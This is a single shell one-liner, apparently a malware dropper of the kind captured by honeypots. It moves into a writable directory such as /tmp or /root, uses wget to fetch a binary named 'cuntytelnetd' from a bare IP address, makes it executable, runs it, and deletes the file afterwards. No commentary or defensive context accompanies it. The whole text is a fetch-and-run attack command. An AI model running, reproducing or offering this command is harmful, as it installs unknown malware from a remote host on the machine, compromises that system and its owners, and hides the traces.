cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.51/cuntytelnetd; chmod +x cuntytelnetd; ./cuntytelnetd; rm -rf cuntytelnetd
